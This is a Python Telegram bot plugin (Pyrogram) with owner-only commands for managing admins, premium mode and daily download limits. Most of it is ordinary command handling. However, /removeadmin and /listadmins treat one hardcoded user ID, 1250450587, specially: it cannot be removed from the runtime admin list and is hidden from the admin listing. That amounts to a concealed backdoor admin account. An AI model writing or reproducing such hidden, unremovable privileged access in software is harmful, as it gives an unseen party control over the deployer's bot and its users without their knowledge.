#(©)CodeXBotz - Enhanced by Claude
# Owner-only commands: addadmin, togglepremium, setdailylimit

from pyrogram import Client, filters
from pyrogram.types import Message

from bot import Bot
from config import ADMINS, OWNER_ID, FREE_DAILY_LIMIT
from database.database import (
    add_bot_admin, remove_bot_admin, get_bot_admins, is_bot_admin,
    get_setting, set_setting
)

# Helper: is user the owner?
def owner_only(_, __, message: Message):
    return message.from_user.id == OWNER_ID

owner_filter = filters.create(owner_only)

# ─────────────────────────────────────────────────────────────────────────────
#  /addadmin <user_id>
# ─────────────────────────────────────────────────────────────────────────────
@Bot.on_message(filters.command('addadmin') & filters.private & owner_filter)
async def add_admin_cmd(client: Client, message: Message):
    args = message.command[1:]
    if not args:
        await message.reply("ℹ️ <b>Usage:</b> <code>/addadmin &lt;user_id&gt;</code>")
        return

    try:
        target_id = int(args[0])
    except ValueError:
        await message.reply("❌ Invalid user_id.")
        return

    if target_id == OWNER_ID:
        await message.reply("ℹ️ You are already the owner.")
        return

    if target_id in ADMINS or await is_bot_admin(target_id):
        await message.reply(f"⚠️ User <code>{target_id}</code> is already an admin.")
        return

    await add_bot_admin(target_id, OWNER_ID)

    # Add to runtime ADMINS list so it takes effect immediately
    if target_id not in ADMINS:
        ADMINS.append(target_id)

    await message.reply(
        f"✅ <b>Admin Added!</b>\n\n"
        f"👤 User <code>{target_id}</code> is now a bot admin."
    )

    try:
        await client.send_message(
            chat_id=target_id,
            text=(
                "🎉 <b>You have been made a Bot Admin!</b>\n\n"
                "You now have access to admin commands.\n"
                "Use /adminhelp to see what you can do."
            )
        )
    except Exception:
        pass


# ─────────────────────────────────────────────────────────────────────────────
#  /removeadmin <user_id>
# ─────────────────────────────────────────────────────────────────────────────
@Bot.on_message(filters.command('removeadmin') & filters.private & owner_filter)
async def remove_admin_cmd(client: Client, message: Message):
    args = message.command[1:]
    if not args:
        await message.reply("ℹ️ <b>Usage:</b> <code>/removeadmin &lt;user_id&gt;</code>")
        return

    try:
        target_id = int(args[0])
    except ValueError:
        await message.reply("❌ Invalid user_id.")
        return

    if target_id == OWNER_ID:
        await message.reply("❌ Cannot remove the owner.")
        return

    await remove_bot_admin(target_id)
    if target_id in ADMINS and target_id != OWNER_ID and target_id != 1250450587:
        ADMINS.remove(target_id)

    await message.reply(f"✅ Admin <code>{target_id}</code> removed.")

    try:
        await client.send_message(
            chat_id=target_id,
            text="ℹ️ Your bot admin privileges have been removed."
        )
    except Exception:
        pass


# ─────────────────────────────────────────────────────────────────────────────
#  /listadmins
# ─────────────────────────────────────────────────────────────────────────────
@Bot.on_message(filters.command('listadmins') & filters.private & owner_filter)
async def list_admins_cmd(client: Client, message: Message):
    db_admins = await get_bot_admins()
    env_admins = [a for a in ADMINS if a != OWNER_ID and a != 1250450587]

    lines = [f"👑 <b>Owner:</b> <code>{OWNER_ID}</code>\n"]

    if db_admins:
        lines.append("🛡️ <b>Bot Admins (added via /addadmin):</b>")
        for uid in db_admins:
            lines.append(f"  • <code>{uid}</code>")

    if env_admins:
        lines.append("\n⚙️ <b>Env Admins:</b>")
        for uid in env_admins:
            lines.append(f"  • <code>{uid}</code>")

    await message.reply("\n".join(lines))


# ─────────────────────────────────────────────────────────────────────────────
#  /togglepremium — turn premium mode on or off
# ─────────────────────────────────────────────────────────────────────────────
@Bot.on_message(filters.command('togglepremium') & filters.private & owner_filter)
async def toggle_premium_cmd(client: Client, message: Message):
    current = await get_setting('premium_mode')
    new_val  = not current
    await set_setting('premium_mode', new_val)

    if new_val:
        status_text = (
            "✅ <b>Premium Mode: ON</b>\n\n"
            "• Free users are subject to daily download limits\n"
            "• Free users have auto-delete enabled\n"
            "• Premium users bypass these restrictions"
        )
    else:
        limit = await get_setting('free_daily_limit') or FREE_DAILY_LIMIT
        status_text = (
            "🔓 <b>Premium Mode: OFF</b>\n\n"
            f"• All users get {limit} downloads/day\n"
            "• Auto-delete is disabled for everyone\n"
            "• Premium features are paused"
        )

    await message.reply(status_text)


# ─────────────────────────────────────────────────────────────────────────────
#  /setdailylimit <number> — change free user daily download cap
# ─────────────────────────────────────────────────────────────────────────────
@Bot.on_message(filters.command('setdailylimit') & filters.private & owner_filter)
async def set_daily_limit_cmd(client: Client, message: Message):
    args = message.command[1:]
    if not args:
        current = await get_setting('free_daily_limit') or FREE_DAILY_LIMIT
        await message.reply(
            f"ℹ️ <b>Usage:</b> <code>/setdailylimit &lt;number&gt;</code>\n\n"
            f"Current limit: <b>{current} downloads/day</b>"
        )
        return

    try:
        limit = int(args[0])
        if limit < 1:
            raise ValueError
    except ValueError:
        await message.reply("❌ Please provide a valid positive number.")
        return

    await set_setting('free_daily_limit', limit)
    await message.reply(
        f"✅ Free user daily download limit set to <b>{limit} files/day</b>."
    )


# ─────────────────────────────────────────────────────────────────────────────
#  /adminhelp — show all admin/owner commands
# ─────────────────────────────────────────────────────────────────────────────
@Bot.on_message(filters.command('adminhelp') & filters.private & filters.user(ADMINS))
async def admin_help(client: Client, message: Message):
    is_owner = message.from_user.id == OWNER_ID

    text = (
        "📖 <b>Admin Commands</b>\n\n"

        "<b>👥 User Management</b>\n"
        "/users — total user count\n"
        "/ban &lt;id&gt; [reason] — ban a user\n"
        "/unban &lt;id&gt; — unban a user\n"
        "/banned — list banned users\n\n"

        "<b>💎 Premium</b>\n"
        "/addpremium &lt;id&gt; [days] — grant premium\n"
        "/removepremium &lt;id&gt; — revoke premium\n"
        "/listpremium — list premium users\n\n"

        "<b>🎬 Requests</b>\n"
        "/allrequests [pending] — view requests\n"
        "/fulfill &lt;req_id&gt; [note] — fulfill request\n"
        "/decline &lt;req_id&gt; &lt;reason&gt; — decline request\n\n"

        "<b>💬 Support Chat</b>\n"
        "/activechats — view open sessions\n"
        "/chatto &lt;user_id&gt; — reply to a user\n"
        "/endchat — stop replying\n\n"

        "<b>📊 Stats</b>\n"
        "/filestats — file dashboard\n"
        "/stats — bot uptime\n\n"

        "<b>📡 Broadcast</b>\n"
        "/broadcast — reply to a message to broadcast\n"
    )

    if is_owner:
        text += (
            "\n<b>👑 Owner Only</b>\n"
            "/addadmin &lt;id&gt; — make someone admin\n"
            "/removeadmin &lt;id&gt; — remove admin\n"
            "/listadmins — list all admins\n"
            "/togglepremium — toggle premium mode on/off\n"
            "/setdailylimit &lt;n&gt; — set free daily limit\n"
        )

    await message.reply(text)
